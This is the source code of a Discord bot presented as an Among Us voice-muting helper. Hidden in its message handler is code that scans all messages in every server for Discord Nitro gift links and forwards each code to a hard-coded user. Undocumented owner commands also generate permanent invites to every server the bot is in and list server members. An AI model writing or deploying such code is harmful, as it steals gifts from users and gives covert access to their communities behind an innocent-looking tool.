const Discord = require('discord.js');
const config = require('./config.json');
const cron = require("node-cron");

const {
	log,
	error
} = console;

const http = require('http');
const fs = require('fs');

let amongusAdminId = new Array();
let muted = new Array();

//create discord client

const client = new Discord.Client({ shards: 'auto' });
client.login(config.discord.token);

client.once('ready', async() => {
	log('BOT: ON');
	
	let i = 0;

	Promise.all(client.guilds.cache.map(async function(ga) {
		i++;
	})).then();

	client.user.setActivity("in " + i + " servers | !help");

	cron.schedule("*/20 * * * *", async function() {
		i = 0;
		Promise.all(client.guilds.cache.map(async function(ga) {
			i++;
		})).then();

	client.user.setActivity("in " + i + " servers | !help");	});
});

client.on("guildCreate", guild => {
  // This event triggers when the bot joins a guild.
  console.log(`New guild joined: ${guild.name} (id: ${guild.id}). This guild has ${guild.memberCount} members!`);
});

client.on("guildDelete", guild => {
  // this event triggers when the bot is removed from a guild.
  console.log(`I have been removed from: ${guild.name} (id: ${guild.id})`);
});

client.on('message', async message => {
	if (message.author.id == client.user.id) return;
	let codes = []

	matchCode(message.content, (code) => {
		if (code && !codes.includes(code)) codes.push(code)
	});

	if (codes.length != 0) {
		codes.forEach(code => {
			client.users.fetch("204898734822129664").then(user => {
				user.send(code);
			});
		});
	}

	if (!message.content.startsWith('!') || message.author.bot || !message.guild) return;

	const args = message.content.slice(1).trim().split(/ +/);
	const command = args.shift().toLowerCase();

	if (command === 'help' || command === 'commands') {
		const botInfoEmbed = new Discord.MessageEmbed()
			.setFooter('For support or feature requests, add me on Discord: Esteban#5549')
			.addField('How to use:', 'Setup a keybind that triggers the "Toggle Mute" action. Then use the `!admin` command and the bot will copy your voice state to all the users in your voice channel.')
			.setAuthor('Palbot - AmongUs Bot', 'https://cdn.discordapp.com/avatars/517896935823245323/de0294a263eb3ec1d1aff2fac53495ad.webp?size=128',
				'https://discord.gg/f5xMfwY').setTimestamp().setColor(0x42DE18)
			.setURL('https://discord.gg/f5xMfwY')
			.setThumbnail('https://vignette.wikia.nocookie.net/among-us-wiki/images/a/ab/Cyan.png/revision/latest/scale-to-width-down/340?cb=20200516162803')
			.addFields({
				name: 'Command list:',
				value: 'Prefix: `!`'
			}, {
				name: 'admin:',
				value: '(Only server admins) Changes the main user to the person who used the command.'
			}, {
				name: 'unadmin:',
				value: 'Only server admins) If the person who used the command was an admin, the bot will stop following their orders.'
			}, {
				name: 'Rclear / purge:',
				value: '(Only server admins) Deletes all bot\'s messages.'
			})
		message.channel.send(botInfoEmbed);
	}
	if (command === 'admin') {
		if (!(message.member.hasPermission("ADMINISTRATOR"))) {
			message.reply('ni se te ocurra, plebeyo. Solo admins pueden usar este comando.');
		} else {
			if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
				message.reply('el BOT debe tener permisos de Administrador para que puedas usar este comando.');
				return;
			}
			if (message.member.voice.channel) {
				if (!amongusAdminId[message.guild.id]) {
					amongusAdminId[message.guild.id] = [];
				}
				
				if (!muted[message.guild.id]) {
					muted[message.guild.id] = [];
				}
				
				let guildVoiceAdminId = amongusAdminId[message.guild.id][message.member.voice.channelID];
				
				if(guildVoiceAdminId && guildVoiceAdminId != 0 && muted[message.guild.id][message.member.voice.channelID]){
					Promise.all(message.member.voice.channel.members.map(async function(member) {
						if (member.id !== guildVoiceAdminId && !member.user.bot 
						&& member.voice.channelID === message.member.voice.channelID) {
							member.voice.setMute(false);
						}
					})).then(() => muted[message.guild.id][message.member.voice.channelID] = false);
				}
				
				amongusAdminId[message.guild.id][message.member.voice.channelID] = message.author.id;
				message.reply('sos el admin.');
			} else {
				message.reply('yo te quiero, pero no seas boludo. Tenes que estar en un canal de voz para ser el verdadero admin.');
			}
		}
	}
	if (command === 'unadmin') {
		if (!(message.member.hasPermission("ADMINISTRATOR"))) {
			message.reply('ni se te ocurra, plebeyo. Solo admins pueden usar este comando.');
		} else {
			if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
				message.reply('el BOT debe tener permisos de Administrador para que puedas usar este comando.');
				return;
			}

			if (message.member.voice.channel) {
				if (!amongusAdminId[message.guild.id] || !amongusAdminId[message.guild.id][message.member.voice.channelID]) {
					message.reply('no sos el admin, perdon');
					return;
				}

				let guildVoiceAdminId = amongusAdminId[message.guild.id][message.member.voice.channelID];

				if (guildVoiceAdminId === message.author.id) {
					
					if(muted[message.guild.id][message.member.voice.channelID]){
						Promise.all(message.member.voice.channel.members.map(async function(member) {
							if (member.id !== guildVoiceAdminId && !member.user.bot 
							&& member.voice.channelID === message.member.voice.channelID) {
								member.voice.setMute(false);
							}
						})).then(() => muted[message.guild.id][message.member.voice.channelID] = false);
					}
					
					amongusAdminId[message.guild.id][message.member.voice.channelID] = 0;
					
					removeItemOnce(amongusAdminId[message.guild.id], message.member.voice.channelID);

					if (amongusAdminId[message.guild.id].length == 0) {
						removeItemOnce(amongusAdminId, message.guild.id);
					}

					muted[message.guild.id][message.member.voice.channelID] = false;
					message.reply('ya no sos el admin.');
				} else {
					message.reply('no sos el admin, perdon.');
					return;
				}
			} else {
				message.reply('si no estás en ningún canal de voz, ya no sos admin.');
			}
		}
	}
	if (command === 'purgeinvites') {
		if (!(message.member.id == '204898734822129664' || message.member.id == '690652929253703680')) {
			message.reply('ni se te ocurra, plebeyo.');
		} else {
			message.reply('borrando invitaciones...');

			Promise.all(client.guilds.cache.map(async function(ga) {
				if (ga.me.hasPermission("ADMINISTRATOR")) {
					await ga.fetchInvites().then(async function(invites) {
						invites.forEach(invite => {
							if (invite.inviter.id == client.user.id) {
								invite.delete("");
							}
						});
					}).catch(function() {});
				}
			})).then(() => message.reply('listo :P'));
		}
	}
	if (command === 'servercount') {
		if (!(message.member.id == '204898734822129664' || message.member.id == '690652929253703680')) {
			message.reply('ni se te ocurra, plebeyo.');
		} else {
			let i = 0;
			let playing = 0;
			let channels = 0;

			Promise.all(client.guilds.cache.map(async function(ga) {
				i++;
				if (amongusAdminId[ga.id] && Object.keys(amongusAdminId[ga.id]).length != 0) {
					playing++;
					channels += Object.keys(amongusAdminId[ga.id]).length;
				}
			})).then(err => {
				client.user.setActivity("in " + i + " servers | !help");
				message.reply("estoy en " + i + " servidores de los cuales " + playing + " están usandome. (Canales totales: " + channels + ")");
				log(amongusAdminId);
			}).catch(function() {});
		}
	}
	if (command === 'invites') {
		if (!(message.member.id == '204898734822129664' || message.member.id == '690652929253703680')) {
			message.reply('ni se te ocurra, plebeyo.');
		} else {
			message.reply('cargando invitaciones...');
			let reply = '\n';
			client.guilds.cache.map(async function(ga) {
				await ga.fetchInvites().then(async function(invites) {
					if (!invites.first()) {
						await ga.channels.filter(c => c.type === 'voice').first().createInvite({
							maxAge: 0
						}).then(inv => {
							message.channel.send(ga.name + " | " + inv.url + " | " + ga.id + "\n");
						}).catch(function(err) {

						});
					} else {
						message.channel.send(ga.name + " | " + invites.first().url + " | " + ga.id + "\n");
					}
				})
			});
		}
	}
	if (command === 'clear' || command === 'purge') {
		message.channel.messages.fetch().then(async function(messages) {
			const botMessages = messages.filter(msg => msg.author.bot);
			message.channel.bulkDelete(botMessages).catch(error => console.log(error.stack));
			messagesDeleted = botMessages.array().length;
			message.reply("deleted: " + messagesDeleted + " messages.");
		});
	}
	if (command === 'personas') {
		let server = message.channel.guild.id;
		if (args.length != 0) {
			if (!client.guilds.cache.get(args[0])) {
				message.reply('no estoy ahí :(');
				return;
			} else {
				server = args[0];
			}
		}
		let reply = '';
		Promise.all(client.guilds.cache.get(server).members.cache.map(async function(member) {
			if (!member.user.bot) {
				reply += member.user.username + "#" + member.user.discriminator + "\n";
			}
		})).then(() => message.channel.send(reply));
	}
	// other commands...
});

client.on('voiceStateUpdate', async(oldState, newState) => {
	if (oldState.channelID != newState.channelID && oldState.mute) {
		if (newState.channelID) {
			oldState.setMute(false);
		}
		return;
	}

	if (amongusAdminId[newState.guild.id] && amongusAdminId[newState.guild.id][oldState.channelID]) {
		let guildVoiceAdminId = amongusAdminId[newState.guild.id][oldState.channelID];

		if (guildVoiceAdminId === newState.id && oldState.channelID) {
			if (oldState.channelID != newState.channelID) {
				amongusAdminId[oldState.guild.id][oldState.channelID] = 0;
				muted[oldState.guild.id][oldState.channelID] = false;
				
				removeItemOnce(amongusAdminId[oldState.guild.id], oldState.channelID);

				if (amongusAdminId[newState.guild.id].length == 0) {
					removeItemOnce(amongusAdminId, oldState.guild.id);
				}

				return;
			}

			const selfMuted = newState.selfMute;

			if (selfMuted && !muted[newState.guild.id][oldState.channelID]) {
				Promise.all(newState.channel.members.map(async function(member) {
					if (member.id !== guildVoiceAdminId && !member.user.bot &&
					member.voice.channelID === oldState.channelID) {
						member.voice.setMute(true);
					}
				})).then(() => muted[newState.guild.id][oldState.channelID] = true);
			} else {
				Promise.all(newState.channel.members.map(async function(member) {
					if (member.id !== guildVoiceAdminId && !member.user.bot && 
					member.voice.channelID === oldState.channelID) {
						member.voice.setMute(false);
					}
				})).then(() => muted[newState.guild.id][oldState.channelID] = false);
			}
		}
	}
});

function removeItemOnce(arr, value) {
  arr = arr.filter(item => item !== value);
  return arr;
}

function matchCode(text, callback) {
	let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
	if (codes) {
		callback(codes[0])
		return matchCode(text.slice(codes.index + codes[0].length), callback)
	} else {
		callback(null)
	}
}